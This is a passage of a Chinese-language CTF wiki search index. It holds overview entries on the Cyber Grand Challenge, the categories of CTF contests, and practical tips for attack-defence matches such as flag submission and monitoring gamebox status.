value (to add to the confusion)","title":"WTF.SQL"},{"location":"introduction/cgc/","text":"\u672c\u8282\u5185\u5bb9\u6458\u81ea\u674e\u5eb7\u6559\u6388\u4e8e 2016 \u5e74 8 \u6708 17 \u65e5 ISC \u4e92\u8054\u7f51\u5b89\u5168\u5927\u4f1a\u6f14\u8bb2\u300a\u7f51\u7edc\u8d85\u7ea7\u6311\u6218\u8d5b\u4e2d\u7684\u6f0f\u6d1e\u53d1\u6398\u4e0e\u5229\u7528\u300b\u3002 CGC \u7f51\u7edc\u8d85\u7ea7\u6311\u6218\u8d5b\u662f\u5168\u7403\u9996\u6b21\u673a\u5668\u7f51\u7edc\u653b\u9632\u6bd4\u8d5b\uff0c\u6bd4\u8d5b\u8fc7\u7a0b\u5168\u81ea\u52a8\uff0c\u65e0\u4efb\u4f55\u4eba\u5de5\u5e72\u9884\u3002\u8003\u9a8c\u673a\u5668\u81ea\u52a8\u6f0f\u6d1e\u6316\u6398\u3001\u81ea\u52a8\u8f6f\u4ef6\u52a0\u56fa\u3001\u81ea\u52a8\u6f0f\u5229\u7528\u548c\u81ea\u52a8\u7f51\u7edc\u9632\u62a4\u6c34\u5e73\u3002\u4f7f\u7528\u7b80\u5316\u7684 Linux \u64cd\u4f5c\u7cfb\u7edf------DECREE\uff0c\u7c7b\u4f3c Snort \u7684\u89c4\u5219\u8fc7\u6ee4\u9632\u706b\u5899\u3002\u5bf9 Linux \u4e8c\u8fdb\u5236\u7a0b\u5e8f\u8fdb\u884c\u6f0f\u6d1e\u6316\u6398\u3002\u6240\u6709\u53c2\u8d5b\u961f\u90fd\u6ca1\u6709\u7a0b\u5e8f\u6e90\u7801\u3002 \u5728 2016 \u5e74\u7684 CGC \u6bd4\u8d5b\u4e2d\uff0c\u6311\u6218\u7684\u8d5b\u9898\u5305\u542b\u4e86 53 \u79cd CWE\u3002\u5176\u4e2d\u5305\u542b 28 \u4e2a\u5806\u6ea2\u51fa\u6f0f\u6d1e\u300124 \u4e2a\u6808\u6ea2\u51fa\u6f0f\u6d1e\u300116 \u4e2a\u7a7a\u6307\u9488\u8bbf\u95ee\u6f0f\u6d1e\u300113 \u4e2a\u6574\u6570\u6ea2\u51fa\u6f0f\u6d1e\u548c 8 \u4e2a UAF \u6f0f\u6d1e\u3002 \u653b\u9632\u8fc7\u7a0b\u7531\u7ec4\u7ec7\u65b9\u53d1\u51fa\u6311\u6218\u7a0b\u5e8f\uff0c\u5404\u56e2\u961f\u670d\u52a1\u5668\u53ef\u4ee5\u5411\u7ec4\u7ec7\u65b9\u63d0\u4f9b\u8865\u4e01\u7a0b\u5e8f\uff0c\u9632\u706b\u5899\u89c4\u5219\u548c\u653b\u51fb\u7a0b\u5e8f\u3002\u4fee\u8865\u8fc7\u7684\u7a0b\u5e8f\u548c\u9632\u706b\u5899\u89c4\u5219\u4f1a\u5206\u53d1\u7ed9\u5176\u4ed6\u56e2\u961f\u3002\u7ec4\u7ec7\u65b9\u4e3a\u6bcf\u4e2a\u56e2\u961f\u8fd0\u884c\u6311\u6218\u7a0b\u5e8f\uff0c\u8fdb\u884c\u670d\u52a1\u6d4b\u8bd5\u548c\u653b\u51fb\u5e76\u8fdb\u884c\u8bc4\u4f30\u3002 \u6027\u80fd\u8bc4\u4ef7\u6307\u6807 \u00b6 \u670d\u52a1\u6b63\u5e38\u8bbf\u95ee\u7684\u53cd\u5e94\u65f6\u95f4\uff1b \u6253\u8865\u4e01\u9891\u7387\uff1b \u52a0\u56fa\u7a0b\u5e8f\u7684\u6548\u7387\uff1b \u6210\u529f\u9632\u5fa1\u653b\u51fb\u7684\u6b21\u6570\u7edf\u8ba1\uff1b \u653b\u51fb\u6210\u529f\u6b21\u6570\u7edf\u8ba1\u3002 \u660e\u786e\u6838\u5fc3\u4efb\u52a1 \u00b6 \u62ff\u5230\u4e8c\u8fdb\u5236\u7a0b\u5e8f\uff0c\u8fdb\u884c\u81ea\u52a8\u5206\u6790\uff0c\u5728\u660e\u786e\u9632\u706b\u5899\u89c4\u5219\u540e\u5bf9\u7a0b\u5e8f\u8fdb\u884c\u52a0\u56fa\u5e76\u751f\u6210\u653b\u51fb\u7a0b\u5e8f\u3002 \u5206\u6790\u65b9\u6cd5 \u00b6 \u5177\u4f53\u6267\u884c-\u4f7f\u7528\u6b63\u5e38\u7684\u6267\u884c\u6a21\u5f0f\uff1b \u7b26\u53f7\u6267\u884c-\u8f85\u52a9 Fuzzing \u9636\u6bb5\u7684\u8def\u5f84\u9009\u62e9\uff1b \u6df7\u5408\u6267\u884c-\u5e26\u6709\u5177\u4f53\u8f93\u5165\u7684\u7b26\u53f7\u6267\u884c\uff0c\u6839\u636e\u8f93\u5165\u9009\u62e9\u8def\u5f84\uff0c\u4f46\u4fdd\u7559\u7b26\u53f7\u6761\u4ef6\u3002 CGC \u7ecf\u9a8c\u603b\u7ed3 \u00b6 \u5b8c\u7f8e\u9632\u5b88\u7684\u96be\u5ea6\u8fdc\u5927\u4e8e\u751f\u6210\u653b\u51fb\u7684\u96be\u5ea6\uff1b \u4e8c\u8fdb\u5236\u52a0\u56fa\u7a0b\u5e8f\u9700\u8981\u907f\u514d\u529f\u80fd\u635f\u5931\uff0c\u5e76\u6700\u5c0f\u5316\u6027\u80fd\u635f\u5931\uff1b \u5b89\u5168\u81ea\u52a8\u5316\u5904\u7406\u7684\u5927\u8d8b\u52bf\u5df2\u7ecf\u5f62\u6210\uff0c\u591a\u6570\u56e2\u961f\u53ef\u4ee5\u5728\u51e0\u79d2\u949f\u7684\u65f6\u95f4\u5bf9\u7b80\u5355\u5e94\u7528\u5f62\u6210\u653b\u51fb\u5e76\u751f\u6210\u6709\u6548\u9632\u5b88\uff1b \u5bf9\u6297\u4e2d\u7684\u7b56\u7565\u7814\u7a76\u503c\u5f97\u671f\u5f85\uff0c\u6839\u636e\u81ea\u8eab\u548c\u5bf9\u624b\u7684\u653b\u9632\u80fd\u529b\uff0c\u5bf9\u8d44\u6e90\u548c\u52a8\u4f5c\u8fdb\u884c\u5408\u7406\u8c03\u6574\u3002","title":"Cgc"},{"location":"introduction/cgc/#_1","text":"\u670d\u52a1\u6b63\u5e38\u8bbf\u95ee\u7684\u53cd\u5e94\u65f6\u95f4\uff1b \u6253\u8865\u4e01\u9891\u7387\uff1b \u52a0\u56fa\u7a0b\u5e8f\u7684\u6548\u7387\uff1b \u6210\u529f\u9632\u5fa1\u653b\u51fb\u7684\u6b21\u6570\u7edf\u8ba1\uff1b \u653b\u51fb\u6210\u529f\u6b21\u6570\u7edf\u8ba1\u3002","title":"\u6027\u80fd\u8bc4\u4ef7\u6307\u6807"},{"location":"introduction/cgc/#_2","text":"\u62ff\u5230\u4e8c\u8fdb\u5236\u7a0b\u5e8f\uff0c\u8fdb\u884c\u81ea\u52a8\u5206\u6790\uff0c\u5728\u660e\u786e\u9632\u706b\u5899\u89c4\u5219\u540e\u5bf9\u7a0b\u5e8f\u8fdb\u884c\u52a0\u56fa\u5e76\u751f\u6210\u653b\u51fb\u7a0b\u5e8f\u3002","title":"\u660e\u786e\u6838\u5fc3\u4efb\u52a1"},{"location":"introduction/cgc/#_3","text":"\u5177\u4f53\u6267\u884c-\u4f7f\u7528\u6b63\u5e38\u7684\u6267\u884c\u6a21\u5f0f\uff1b \u7b26\u53f7\u6267\u884c-\u8f85\u52a9 Fuzzing \u9636\u6bb5\u7684\u8def\u5f84\u9009\u62e9\uff1b \u6df7\u5408\u6267\u884c-\u5e26\u6709\u5177\u4f53\u8f93\u5165\u7684\u7b26\u53f7\u6267\u884c\uff0c\u6839\u636e\u8f93\u5165\u9009\u62e9\u8def\u5f84\uff0c\u4f46\u4fdd\u7559\u7b26\u53f7\u6761\u4ef6\u3002","title":"\u5206\u6790\u65b9\u6cd5"},{"location":"introduction/cgc/#cgc","text":"\u5b8c\u7f8e\u9632\u5b88\u7684\u96be\u5ea6\u8fdc\u5927\u4e8e\u751f\u6210\u653b\u51fb\u7684\u96be\u5ea6\uff1b \u4e8c\u8fdb\u5236\u52a0\u56fa\u7a0b\u5e8f\u9700\u8981\u907f\u514d\u529f\u80fd\u635f\u5931\uff0c\u5e76\u6700\u5c0f\u5316\u6027\u80fd\u635f\u5931\uff1b \u5b89\u5168\u81ea\u52a8\u5316\u5904\u7406\u7684\u5927\u8d8b\u52bf\u5df2\u7ecf\u5f62\u6210\uff0c\u591a\u6570\u56e2\u961f\u53ef\u4ee5\u5728\u51e0\u79d2\u949f\u7684\u65f6\u95f4\u5bf9\u7b80\u5355\u5e94\u7528\u5f62\u6210\u653b\u51fb\u5e76\u751f\u6210\u6709\u6548\u9632\u5b88\uff1b \u5bf9\u6297\u4e2d\u7684\u7b56\u7565\u7814\u7a76\u503c\u5f97\u671f\u5f85\uff0c\u6839\u636e\u81ea\u8eab\u548c\u5bf9\u624b\u7684\u653b\u9632\u80fd\u529b\uff0c\u5bf9\u8d44\u6e90\u548c\u52a8\u4f5c\u8fdb\u884c\u5408\u7406\u8c03\u6574\u3002","title":"CGC \u7ecf\u9a8c\u603b\u7ed3"},{"location":"introduction/content/","text":"\u56e0\u4e3a CTF \u7684\u8003\u9898\u8303\u56f4\u5176\u5b9e\u6bd4\u8f83\u5bbd\u5e7f\uff0c\u76ee\u524d\u4e5f\u6ca1\u6709\u592a\u660e\u786e\u7684\u89c4\u5b9a\u754c\u9650\u8bf4\u4f1a\u8003\u54ea\u4e9b\u5185\u5bb9\u3002\u4f46\u662f\u5c31\u76ee\u524d\u7684\u6bd4\u8d5b\u9898\u578b\u800c\u8a00\u7684\u8bdd\uff0c\u4e3b\u8981\u8fd8\u662f\u4f9d\u636e\u5e38\u89c1\u7684 Web \u7f51\u7edc\u653b\u9632\u3001RE \u9006\u5411\u5de5\u7a0b\u3001Pwn \u4e8c\u8fdb\u5236\u6f0f\u6d1e\u5229\u7528\u3001Crypto \u5bc6\u7801\u653b\u51fb\u3001Mobile \u79fb\u52a8\u5b89\u5168 \u4ee5\u53ca Misc \u5b89\u5168\u6742\u9879 \u6765\u8fdb\u884c\u5206\u7c7b\u3002 Web - \u7f51\u7edc\u653b\u9632 \u4e3b\u8981\u4ecb\u7ecd\u4e86 Web \u5b89\u5168\u4e2d\u5e38\u89c1\u7684\u6f0f\u6d1e\uff0c\u5982 SQL \u6ce8\u5165\u3001XSS\u3001CSRF\u3001\u6587\u4ef6\u5305\u542b\u3001\u6587\u4ef6\u4e0a\u4f20\u3001\u4ee3\u7801\u5ba1\u8ba1\u3001PHP \u5f31\u7c7b\u578b\u7b49\uff0cWeb \u5b89\u5168\u4e2d\u5e38\u89c1\u7684\u9898\u578b\u53ca\u89e3\u9898\u601d\u8def\uff0c\u63d0\u4f9b\u4e86\u4e00\u4e9b\u5e38\u7528\u7684\u5de5\u5177\u3002 Reverse Engineering - \u9006\u5411\u5de5\u7a0b \u4e3b\u8981\u4ecb\u7ecd\u4e86\u9006\u5411\u5de5\u7a0b\u4e2d\u7684\u5e38\u89c1\u9898\u578b\u3001\u5de5\u5177\u5e73\u53f0\u3001\u89e3\u9898\u601d\u8def\uff0c\u8fdb\u9636\u90e8\u5206\u4ecb\u7ecd\u4e86\u9006\u5411\u5de5\u7a0b\u4e2d\u5e38\u89c1\u7684\u8f6f\u4ef6\u4fdd\u62a4\u3001\u53cd\u7f16\u8bd1\u3001\u53cd\u8c03\u8bd5\u3001\u52a0\u58f3\u8131\u58f3\u6280\u672f\u3002 Pwn - \u4e8c\u8fdb\u5236\u6f0f\u6d1e\u5229\u7528 Pwn \u9898\u76ee\u4e3b\u8981\u8003\u5bdf\u4e8c\u8fdb\u5236\u6f0f\u6d1e\u7684\u53d1\u6398\u548c\u5229\u7528\uff0c\u9700\u8981\u5bf9\u8ba1\u7b97\u673a\u64cd\u4f5c\u7cfb\u7edf\u5e95\u5c42\u6709\u4e00\u5b9a\u7684\u4e86\u89e3\u3002\u5728 CTF \u7ade\u8d5b\u4e2d\uff0cPWN \u9898\u76ee\u4e3b\u8981\u51fa\u73b0\u5728 Linux \u5e73\u53f0\u4e0a\u3002 Crypto - \u5bc6\u7801\u653b\u51fb \u4e3b\u8981\u5305\u62ec\u53e4\u5178\u5bc6\u7801\u5b66\u548c\u73b0\u4ee3\u5bc6\u7801\u5b66\u4e24\u90e8\u5206\u5185\u5bb9\uff0c\u53e4\u5178\u5bc6\u7801\u5b66\u8da3\u5473\u6027\u5f3a\uff0c\u79cd\u7c7b\u7e41\u591a\uff0c\u73b0\u4ee3\u5bc6\u7801\u5b66\u5b89\u5168\u6027\u9ad8\uff0c\u5bf9\u7b97\u6cd5\u7406\u89e3\u7684\u8981\u6c42\u8f83\u9ad8\u3002 Mobile - \u79fb\u52a8\u5b89\u5168 \u4e3b\u8981\u4ecb\u7ecd\u4e86\u5b89\u5353\u9006\u5411\u4e2d\u7684\u5e38\u7528\u5de5\u5177\u548c\u4e3b\u8981\u9898\u578b\uff0c\u5b89\u5353\u9006\u5411\u5e38\u5e38\u9700\u8981\u4e00\u5b9a\u7684\u5b89\u5353\u5f00\u53d1\u77e5\u8bc6\uff0ciOS \u9006\u5411\u9898\u76ee\u5728 CTF \u7ade\u8d5b\u4e2d\u8f83\u5c11\u51fa\u73b0\uff0c\u56e0\u6b64\u4e0d\u4f5c\u8fc7\u591a\u4ecb\u7ecd\u3002 Misc - \u5b89\u5168\u6742\u9879 \u4ee5\u8bf8\u845b\u5efa\u4f1f\u7ffb\u8bd1\u7684\u300a\u7ebf\u4e0a\u5e7d\u7075\uff1a\u4e16\u754c\u5934\u53f7\u9ed1\u5ba2\u7c73\u7279\u5c3c\u514b\u81ea\u4f20\u300b\u548c\u4e00\u4e9b\u5178\u578b MISC \u9898\u4e3a\u5207\u5165\u70b9\uff0c\u5185\u5bb9\u4e3b\u8981\u5305\u62ec\u4fe1\u606f\u641c\u96c6\u3001\u7f16\u7801\u5206\u6790\u3001\u53d6\u8bc1\u5206\u6790\u3001\u9690\u5199\u5206\u6790\u7b49\u3002 \u5168\u56fd\u5927\u5b66\u751f\u4fe1\u606f\u5b89\u5168\u7ade\u8d5b - \u7ade\u8d5b\u5185\u5bb9 \u00b6 2016 \u5e74\u5168\u56fd\u5927\u5b66\u751f\u4fe1\u606f\u5b89\u5168\u7ade\u8d5b\u5f00\u59cb\u8bbe\u7acb\u521b\u65b0\u5b9e\u8df5\u6280\u80fd\u8d5b\uff0c\u91c7\u53d6\u7684\u5c31\u662f\u4f20\u7edf\u7684 CTF \u8d5b\u5236\u3002\u5728\u300a2016 \u5e74\u5168\u56fd\u5927\u5b66\u751f\u4fe1\u606f\u5b89\u5168\u7ade\u8d5b\u53c2\u8d5b\u6307\u5357\u300b\u4e2d\u4e3b\u529e\u65b9\u7ed9\u51fa\u7684\u7ade\u8d5b\u5185\u5bb9\u76f8\u5bf9\u5168\u9762\uff0c\u503c\u5f97\u53c2\u8003\u3002 \u7cfb\u7edf\u5b89\u5168\u3002\u6d89\u53ca\u64cd\u4f5c\u7cfb\u7edf\u548c Web \u7cfb\u7edf\u5b89\u5168\uff0c\u5305\u62ec Web \u7f51\u7ad9\u591a\u79cd\u8bed\u8a00\u6e90\u4ee3\u7801\u5ba1\u8ba1\u5206\u6790\uff08\u7279\u522b\u662f PHP\uff09\u3001\u6570\u636e\u5e93\u7ba1\u7406\u548c SQL \u64cd\u4f5c\u3001Web \u6f0f\u6d1e\u6316\u6398\u548c\u5229\u7528\uff08\u5982 SQL \u6ce8\u5165\u548c XSS\uff09\u3001\u670d\u52a1\u5668\u63d0\u6743\u3001\u7f16\u5199\u4ee3\u7801\u8865\u4e01\u5e76\u4fee\u590d\u7f51\u7ad9\u6f0f\u6d1e\u7b49\u5b89\u5168\u6280\u80fd\u3002 \u8f6f\u4ef6\u9006\u5411\u3002\u6d89\u53ca Windows/Linux/Android \u5e73\u53f0\u7684\u591a\u79cd\u7f16\u7a0b\u6280\u672f\uff0c\u8981\u6c42\u5229\u7528\u5e38\u7528\u5de5\u5177\u5bf9\u6e90\u4ee3\u7801\u53ca\u4e8c\u8fdb\u5236\u6587\u4ef6\u8fdb\u884c\u9006\u5411\u5206\u6790\uff0c\u638c\u63e1 Android \u79fb\u52a8\u5e94\u7528 APK \u6587\u4ef6\u7684\u9006\u5411\u5206\u6790\uff0c\u638c\u63e1\u52a0\u89e3\u5bc6\u3001\u5185\u6838\u7f16\u7a0b\u3001\u7b97\u6cd5\u3001\u53cd\u8c03\u8bd5\u548c\u4ee3\u7801\u6df7\u6dc6\u6280\u672f\u3002 \u6f0f\u6d1e\u6316\u6398\u548c\u5229\u7528\u3002\u638c\u63e1 C/C++/Python/PHP/Java/Ruby/\u6c47\u7f16 \u7b49\u8bed\u8a00\uff0c\u6316\u6398 Windows/Linux\uff08x86/x86\uff3f64 \u5e73\u53f0\uff09\u4e8c\u8fdb\u5236\u7a0b\u5e8f\u6f0f\u6d1e\uff0c\u638c\u63e1\u7f13\u51b2\u533a\u6ea2\u51fa\u548c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u653b\u51fb\uff0c\u7f16\u5199\u5e76\u5229\u7528 shellcode\u3002 \u5bc6\u7801\u5b66\u539f\u7406\u53ca\u5e94\u7528\u3002\u638c\u63e1\u53e4\u5178\u5bc6\u7801\u5b66\u548c\u73b0\u4ee3\u5bc6\u7801\u5b66\uff0c\u5206\u6790\u5bc6\u7801\u7b97\u6cd5\u548c\u534f\u8bae\uff0c\u8ba1\u7b97\u5bc6\u94a5\u548c\u8fdb\u884c\u52a0\u89e3\u5bc6\u64cd\u4f5c\u3002 \u5176\u4ed6\u5185\u5bb9\u3002\u5305\u62ec\u4fe1\u606f\u641c\u96c6\u80fd\u529b\uff0c\u7f16\u7a0b\u80fd\u529b\u3001\u79fb\u52a8\u5b89\u5168\u3001\u4e91\u8ba1\u7b97\u5b89\u5168\u3001\u53ef\u4fe1\u8ba1\u7b97\u3001\u81ea\u4e3b\u53ef\u63a7\u3001\u9690\u5199\u672f\u548c\u4fe1\u606f\u9690\u85cf\u3001\u8ba1\u7b97\u673a\u53d6\u8bc1\uff08Forensics\uff09\u6280\u672f\u548c\u6587\u4ef6\u6062\u590d\u6280\u80fd\uff0c\u8ba1\u7b97\u673a\u7f51\u7edc\u57fa\u7840\u4ee5\u53ca\u5bf9\u7f51\u7edc\u6d41\u91cf\u7684\u5206\u6790\u80fd\u529b\u3002","title":"Content"},{"location":"introduction/content/#-","text":"2016 \u5e74\u5168\u56fd\u5927\u5b66\u751f\u4fe1\u606f\u5b89\u5168\u7ade\u8d5b\u5f00\u59cb\u8bbe\u7acb\u521b\u65b0\u5b9e\u8df5\u6280\u80fd\u8d5b\uff0c\u91c7\u53d6\u7684\u5c31\u662f\u4f20\u7edf\u7684 CTF \u8d5b\u5236\u3002\u5728\u300a2016 \u5e74\u5168\u56fd\u5927\u5b66\u751f\u4fe1\u606f\u5b89\u5168\u7ade\u8d5b\u53c2\u8d5b\u6307\u5357\u300b\u4e2d\u4e3b\u529e\u65b9\u7ed9\u51fa\u7684\u7ade\u8d5b\u5185\u5bb9\u76f8\u5bf9\u5168\u9762\uff0c\u503c\u5f97\u53c2\u8003\u3002 \u7cfb\u7edf\u5b89\u5168\u3002\u6d89\u53ca\u64cd\u4f5c\u7cfb\u7edf\u548c Web \u7cfb\u7edf\u5b89\u5168\uff0c\u5305\u62ec Web \u7f51\u7ad9\u591a\u79cd\u8bed\u8a00\u6e90\u4ee3\u7801\u5ba1\u8ba1\u5206\u6790\uff08\u7279\u522b\u662f PHP\uff09\u3001\u6570\u636e\u5e93\u7ba1\u7406\u548c SQL \u64cd\u4f5c\u3001Web \u6f0f\u6d1e\u6316\u6398\u548c\u5229\u7528\uff08\u5982 SQL \u6ce8\u5165\u548c XSS\uff09\u3001\u670d\u52a1\u5668\u63d0\u6743\u3001\u7f16\u5199\u4ee3\u7801\u8865\u4e01\u5e76\u4fee\u590d\u7f51\u7ad9\u6f0f\u6d1e\u7b49\u5b89\u5168\u6280\u80fd\u3002 \u8f6f\u4ef6\u9006\u5411\u3002\u6d89\u53ca Windows/Linux/Android \u5e73\u53f0\u7684\u591a\u79cd\u7f16\u7a0b\u6280\u672f\uff0c\u8981\u6c42\u5229\u7528\u5e38\u7528\u5de5\u5177\u5bf9\u6e90\u4ee3\u7801\u53ca\u4e8c\u8fdb\u5236\u6587\u4ef6\u8fdb\u884c\u9006\u5411\u5206\u6790\uff0c\u638c\u63e1 Android \u79fb\u52a8\u5e94\u7528 APK \u6587\u4ef6\u7684\u9006\u5411\u5206\u6790\uff0c\u638c\u63e1\u52a0\u89e3\u5bc6\u3001\u5185\u6838\u7f16\u7a0b\u3001\u7b97\u6cd5\u3001\u53cd\u8c03\u8bd5\u548c\u4ee3\u7801\u6df7\u6dc6\u6280\u672f\u3002 \u6f0f\u6d1e\u6316\u6398\u548c\u5229\u7528\u3002\u638c\u63e1 C/C++/Python/PHP/Java/Ruby/\u6c47\u7f16 \u7b49\u8bed\u8a00\uff0c\u6316\u6398 Windows/Linux\uff08x86/x86\uff3f64 \u5e73\u53f0\uff09\u4e8c\u8fdb\u5236\u7a0b\u5e8f\u6f0f\u6d1e\uff0c\u638c\u63e1\u7f13\u51b2\u533a\u6ea2\u51fa\u548c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u653b\u51fb\uff0c\u7f16\u5199\u5e76\u5229\u7528 shellcode\u3002 \u5bc6\u7801\u5b66\u539f\u7406\u53ca\u5e94\u7528\u3002\u638c\u63e1\u53e4\u5178\u5bc6\u7801\u5b66\u548c\u73b0\u4ee3\u5bc6\u7801\u5b66\uff0c\u5206\u6790\u5bc6\u7801\u7b97\u6cd5\u548c\u534f\u8bae\uff0c\u8ba1\u7b97\u5bc6\u94a5\u548c\u8fdb\u884c\u52a0\u89e3\u5bc6\u64cd\u4f5c\u3002 \u5176\u4ed6\u5185\u5bb9\u3002\u5305\u62ec\u4fe1\u606f\u641c\u96c6\u80fd\u529b\uff0c\u7f16\u7a0b\u80fd\u529b\u3001\u79fb\u52a8\u5b89\u5168\u3001\u4e91\u8ba1\u7b97\u5b89\u5168\u3001\u53ef\u4fe1\u8ba1\u7b97\u3001\u81ea\u4e3b\u53ef\u63a7\u3001\u9690\u5199\u672f\u548c\u4fe1\u606f\u9690\u85cf\u3001\u8ba1\u7b97\u673a\u53d6\u8bc1\uff08Forensics\uff09\u6280\u672f\u548c\u6587\u4ef6\u6062\u590d\u6280\u80fd\uff0c\u8ba1\u7b97\u673a\u7f51\u7edc\u57fa\u7840\u4ee5\u53ca\u5bf9\u7f51\u7edc\u6d41\u91cf\u7684\u5206\u6790\u80fd\u529b\u3002","title":"\u5168\u56fd\u5927\u5b66\u751f\u4fe1\u606f\u5b89\u5168\u7ade\u8d5b - \u7ade\u8d5b\u5185\u5bb9"},{"location":"introduction/experience/","text":"\u9996\u5148\u6b63\u5e38\u6bd4\u8d5b\u4f1a\u63d0\u4f9b\u63d0\u4ea4 flag \u7684\u63a5\u53e3\uff0c\u63a5\u53e3\u5730\u5740\u7c7b\u4f3c http://172.16.4.1/Common/submitAnswer \u3002\u4e00\u822c\u6211\u4eec\u9700\u8981\u6839\u636e\u4e3b\u529e\u65b9\u7ed9\u51fa\u7684\u6587\u6863\u8981\u6c42\u901a\u8fc7\u63a5\u53e3\u63d0\u4ea4 flag\u3002\u5728\u6bd4\u8d5b\u4e2d\u8981\u6c42\u63a5\u53e3\u5730\u5740\u4f7f\u7528 Post \u65b9\u5f0f\u63d0\u4ea4\uff0c\u63d0\u4ea4\u65f6\u5e26\u4e24\u4e2a\u53c2\u6570\uff0c\u4e00\u4e2a\u662f Answer \uff0c\u5176\u503c\u4e3a\u83b7\u53d6\u5230\u7684 flag \u5b57\u7b26\u4e32\uff0c\u800c\u53e6\u4e00\u4e2a\u5219\u662f token \uff0c\u5176\u503c\u4e3a\u5404\u4e2a\u961f\u4f0d\u7684\u961f\u4f0d Token\u3002 \u7136\u540e\u6bd4\u8d5b\u65f6\u4e3b\u529e\u65b9\u4e5f\u4f1a\u7ed9\u6bcf\u4e2a\u53c2\u8d5b\u961f\u4f0d\u63d0\u4f9b\u4e00\u53f0\u7528\u4e8e \u5206\u6790\u7f51\u7edc\u6d41\u91cf\u7684\u865a\u62df\u673a \uff0c\u9009\u624b\u9700\u8981\u8bbf\u95ee\u5730\u5740\u4e0b\u8f7d\u6d41\u91cf\u6587\u4ef6\u8fdb\u884c\u5206\u6790\u3002 \u5173\u6ce8 Gamebox \u72b6\u6001 \u00b6 \u6bd4\u8d5b\u4e2d\u53ef\u4ee5\u67e5\u770b\u5df1\u65b9\u548c\u654c\u65b9 GameBox \u72b6\u6001\u3002\u65f6\u523b\u5173\u6ce8\u53ef\u4ee5\u5c3d\u65e9\u83b7\u53d6\u6bd4\u8d5b\u4fe1\u606f\uff0c\u6839\u636e\u4fe1\u606f\u505a\u51fa\u8c03\u6574\u3002 \u5bf9\u4e8e\u5df1\u65b9 GameBox\uff0c\u6709\u5b58\u5728\u5982\u4e0b\u539f\u56e0\u9020\u6210 GameBox \u88ab down \u6389\uff1a \u4e3b\u529e\u65b9\u88c1\u5224\u7cfb\u7edf\u5b58\u5728\u5931\u8bef\uff0c\u8bef\u5224 GameBox \u4e3a\u4e0d\u53ef\u7528\u72b6\u6001\u3002\u8fd9\u79cd\u60c5\u51b5\u4e00\u822c\u5728\u6bd4\u8d5b\u5f00\u59cb\u524d\u53ef\u4ee5\u53d1\u73b0\uff0c\u5982\u679c\u53d1\u73b0\u5b58\u5728\u8fd9\u79cd\u60c5\u51b5\uff0c\u8981\u5c3d\u65e9\u5411\u5de5\u4f5c\u4eba\u5458\u793a\u610f\u5904\u7406\u4ee5\u51cf\u5c11\u635f\u5931\u3002 \u7a0b\u5e8f patch \u5931\u8bef\u5bfc\u81f4\u670d\u52a1\u4e0d\u53ef\u7528\u3002\u5728\u7a0b\u5e8f patch \u5b8c\u4e4b\u540e\u8981\u8fdb\u5165\u4e0b\u4e00\u8f6e\u5173\u6ce8 GameBox \u72b6\u6001\uff0c\u5982\u679c patch \u5931\u8bef\u5bfc\u81f4\u4e0d\u53ef\u7528\uff0c\u9700\u8981\u53ca\u65f6\u633d\u6551\u3002\u4f46\u662f\u4e5f\u4e0d\u8981\u8fc7\u5ea6\u62c5\u5fc3\u628a\u539f\u6765\u7684\u672a\u4fee\u8865\u8fc7\u7684\u6f0f\u6d1e\u7a0b\u5e8f\u6362\u56de\u53bb\u3002\u56e0\u4e3a down \u6389\u662f\u6240\u6709\u961f\u5e73\u5206\u5f97\u5f88\u5c11\u7684\u5206\uff0c\u800c\u76f4\u63a5\u4e0a\u6f0f\u6d1e\u7a0b\u5e8f\u4f1a\u4f7f\u7684\u5f3a\u52bf\u7684\u961f\u4f0d\u76f4\u63a5\u5229\u7528\u5f97\u5230\u5f88\u9ad8\u7684\u5f97\u5206\u3002\u6240\u4ee5\u8981\u4f9d\u636e\u5177\u4f53\u60c5\u51b5\u5bf9\u5f85\u3002 \u5bf9\u624b\u4e0d\u6b63\u5f53\u653b\u51fb\u5bfc\u81f4 GameBox \u4e0d\u53ef\u7528\u3002\u5982\u679c\u53d1\u73b0\uff0c\u9700\u8981\u53ca\u65f6\u8865\u6551\u3002 \u4e3b\u529e\u65b9\u52a0\u5f3a\u7a0b\u5e8f check\u3002\u8fd9\u79cd\u60c5\u51b5\u4e3b\u529e\u65b9\u4f1a\u5bf9\u6240\u6709\u961f\u5458\u8fdb\u884c\u901a\u77e5\u516c\u544a\u3002\u5728 GameBox \u72b6\u6001\u5899\u4e0a\u7684\u72b6\u6001\u4f1a\u663e\u793a\u8be5\u9898\u7684\u5404\u961f GameBox \u5927\u9762\u79ef\u4e0d\u53ef\u7528\u3002 \u5bf9\u4e8e\u654c\u65b9 GameBox\u3002\u6211\u4eec\u53ef\u4ee5\u83b7\u53d6\u4ee5\u4e0b\u4fe1\u606f\u3002 \u6839\u636e\u653b\u51fb\u6d41\u89c2\u6d4b\u54ea\u4e9b\u961f\u4f0d\u7684 GameBox \u6ca1\u6709\u9632\u5fa1\u6210\u529f\u3002\u9488\u5bf9\u8fd9\u4e9b\u961f\u4f0d\u53ef\u4ee5\u66f4\u591a\u5730\u5b9e\u73b0\u653b\u51fb \u6709\u961f\u4f0d\u62ff\u51fa\u4e00\u8840\u65f6\u3002\u53ef\u4ee5\u6839\u636e\u5404\u961f GameBox \u72b6\u6001\u63a8\u65ad\u51fa\u4e00\u8840\u961f\u4f0d\u662f\u5426\u5df2\u7ecf\u5199\u51fa\u5229\u7528\u811a\u672c\u3002\u5199\u51fa\u5229\u7528\u811a\u672c\u540e\u53ef\u4ee5\u89c2\u6d4b\u5df1\u65b9\u662f\u5426\u505a\u597d\u4e86\u9632\u5fa1\u3002 \u5206\u6e05\u533a\u6bb5\u4e0e\u7aef\u53e3 \u00b6 \u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\u4f1a\u4e3b\u529e\u65b9\u4f1a\u5b89\u6392\u597d\u5408\u7406\u7684\u7f51\u6bb5\u5206\u5e03\u3002 \u7ef4\u62a4\u7684\u65f6\u5019\u9700\u8981\u8fde\u63a5\u5230\u672c\u961f GameBox \u6240\u5728\u7f51\u6bb5\u4e0a\uff0c\u6839\u636e\u4e3b\u529e\u65b9\u63d0\u4f9b\u7684 CTF \u8d26\u53f7\u4e0e\u5bc6\u7801\u767b\u5f55\u3002\u800c\u4e0e\u5176\u4ed6\u961f\u4f0d\u7684 GameBox 